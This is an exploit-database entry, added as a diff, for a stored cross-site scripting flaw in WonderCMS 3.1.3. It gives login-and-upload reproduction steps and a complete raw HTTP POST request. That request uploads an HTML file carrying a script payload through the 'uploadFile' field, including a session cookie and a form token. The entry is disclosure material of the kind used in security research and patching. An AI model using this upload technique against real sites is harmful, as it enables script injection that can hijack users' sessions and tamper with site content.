@@ -1,0 +1,44 @@
+# Exploit Title: WonderCMS 3.1.3 - 'uploadFile' Stored Cross-Site Scripting
+# Google Dork: "WonderCMS"
+# Date: 2020-11-27
+# Exploit Author: SunCSR (Sun* Cyber Security Research)
+# Vendor Homepage: https://www.wondercms.com/
+# Software Link: https://github.com/robiso/wondercms/releases/download/3.1.3/WonderCMS-3.1.3.zip
+# Version: 3.1.3
+# Tested on: Ubuntu 20.10
+
+Steps-To-Reproduce:
+1. Login and select button setting
+2. Go to tab Files, and upload file contains payload xss with extension like html, svg, htm
+3. Go to http://target.lc/data/files/<name-file> and trigger XSS
+
+POST /home HTTP/1.1
+Host: wordpress.lc:8081
+Content-Length: 372
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://wordpress.lc:8081
+Content-Type: multipart/form-data;
+boundary=----WebKitFormBoundary6EKP5vjUNS5Icgql
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/87.0.4280.66 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://wordpress.lc:8081/
+Accept-Encoding: gzip, deflate
+Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=74me71gverejuaf2bns2n5fpkf
+Connection: close
+
+------WebKitFormBoundary6EKP5vjUNS5Icgql
+Content-Disposition: form-data; name="uploadFile"; filename="xss.html"
+Content-Type: text/html
+
+<script>alert('XSS')</script>
+------WebKitFormBoundary6EKP5vjUNS5Icgql
+Content-Disposition: form-data; name="token"
+
+5d715f2aebdf138f4968fce8dcd3703778c6fb5a1abea40e27eb9280079474da
+------WebKitFormBoundary6EKP5vjUNS5Icgql--
+
+--
